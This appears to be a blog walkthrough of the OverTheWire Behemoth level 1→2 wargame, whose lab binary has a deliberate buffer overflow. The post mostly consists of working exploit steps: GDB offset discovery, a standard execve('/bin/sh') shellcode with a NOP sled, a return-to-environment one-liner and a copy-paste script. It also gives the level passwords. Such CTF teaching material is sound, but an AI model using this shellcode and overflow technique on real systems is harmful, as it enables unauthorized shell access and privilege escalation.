---
date: 2023-08-30 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Behemoth Level 1 → 2 tutorial!!"
permalink: /posts/Over-The-Wire-Behemoth-Level-1-to-2/
tags: [overthewire, behemoth, exploitation, buffer-overflow, priv-esc, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Behemoth Level 1 → 2!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .behemoth-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .behemoth-nav .nav-left,.behemoth-nav .nav-center,.behemoth-nav .nav-right{flex:1}
  .behemoth-nav .nav-left{text-align:left}
  .behemoth-nav .nav-center{text-align:center}
  .behemoth-nav .nav-right{text-align:right}
  .behemoth-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .behemoth-nav a:hover{transform:translateY(-1px)}
  .behemoth-nav .disabled{opacity:.55}
  :root[data-theme='light'] .behemoth-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="behemoth-nav" aria-label="Behemoth level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-0-to-1/' | relative_url }}">← Previous: Level 0 → 1</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/behemoth/behemoth2.html" target="_blank" rel="noopener">
      Official (Level 2) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-2-to-3/' | relative_url }}">Next: Level 2 → 3 →</a>
  </div>
</nav>

## Login

Log in as **behemoth1** using the password you obtained from Level 0 → 1.

```bash
ssh behemoth1@behemoth.labs.overthewire.org -p 2221
# password: aesebootiv
````

---

## Task

There is a binary called **`/behemoth/behemoth1`**.
This time, `ltrace` won’t help. Instead, the binary is vulnerable to a **stack buffer overflow**.
We need to craft an exploit to overwrite the return address and redirect execution to shellcode we control.

---

## A little bit of Theory

* **gets(3)** → unsafe, doesn’t check buffer length → classic overflow.
* **Offset discovery** → how many bytes to smash EIP.
* **Shellcode in env var** → store `/bin/sh` payload in `SHELLCODE` with a NOP sled.
* **Return-to-env** → overwrite EIP with the address of that variable (in little endian).

**Further reading:**

* [gets(3) manual](https://man7.org/linux/man-pages/man3/gets.3.html)
* [Buffer overflow basics](https://en.wikipedia.org/wiki/Stack_buffer_overflow)
* [Linux x86 shellcode reference](http://shell-storm.org/shellcode/)

---

## Solution

### 1. Baseline run

```bash
cd /behemoth
./behemoth1
Password: blah
Authentication failure.
Sorry.
```

Now try flooding input:

```bash
(python -c "print(128 * 'A')" | ./behemoth1)
# → Segmentation fault
```

---

### 2. Find offset with GDB

```bash
gdb -q ./behemoth1
(gdb) set disassembly-flavor intel
(gdb) disas main
```

You’ll see:

```
sub esp,0x44     ; reserves 68 bytes for input buffer
call gets@plt
```

Now feed a test pattern:

```bash
run < <(python -c "print(71*'A' + 'BBBB')")
```

EIP is now `0x42424242` → ✅ offset ≈ **71 bytes**.

---

### 3. Prepare shellcode in an environment variable

```bash
export SHELLCODE=$(python -c 'print(20*"\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

*This is the standard 32-bit execve("/bin/sh") shellcode, with a 20-byte NOP sled.*

---

### 4. Find address of env var

Helper program `/tmp/find_addr.c`:

```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
    printf("%s is at %p\n", argv[1], getenv(argv[1]));
    return 0;
}
```

Compile & run:

```bash
gcc -m32 /tmp/find_addr.c -o /tmp/find_addr
/tmp/find_addr SHELLCODE
# Example output: SHELLCODE is at 0xffffde80
```

---

### 5. Exploit

Now overwrite EIP with that address (little endian):

```bash
(python -c 'import sys; sys.stdout.write("A"*71 + "\x80\xde\xff\xff")' | ./behemoth1)
```

If successful, you’ll get:

```bash
whoami
# behemoth2
cat /etc/behemoth_pass/behemoth2
# eimahquuof
```

---

## Password

```
eimahquuof
```

---

## Troubleshooting

* **Segfault but no shell** → adjust the return address ±16–64 bytes (land in NOP sled).
* **Wrong offset** → verify with `BBBB` test that EIP really becomes `0x42424242`.
* **Still “Authentication failure”** → ensure your payload ends with `\n`.
* **Env addr mismatch** → check `/tmp/find_addr SHELLCODE` outside gdb (inside gdb, addresses shift).

---

## Copy-paste quick run (one shot)

```bash
ssh behemoth1@behemoth.labs.overthewire.org -p 2221
# password: aesebootiv

# 1) Set env var
export SHELLCODE=$(python -c 'print(20*"\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')

# 2) Helper
cat >/tmp/find_addr.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) { printf("%s is at %p\n", argv[1], getenv(argv[1])); }
EOF
gcc -m32 /tmp/find_addr.c -o /tmp/find_addr
/tmp/find_addr SHELLCODE

# 3) Exploit (adjust address if needed)
cd /behemoth
(python -c 'import sys; sys.stdout.write("A"*71 + "\x80\xde\xff\xff")' | ./behemoth1)

whoami
cat /etc/behemoth_pass/behemoth2
```

---

**Congrats 🎉** You built your first **buffer overflow exploit with ret2env shellcode**, escalated to **behemoth2**, and captured the next password!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

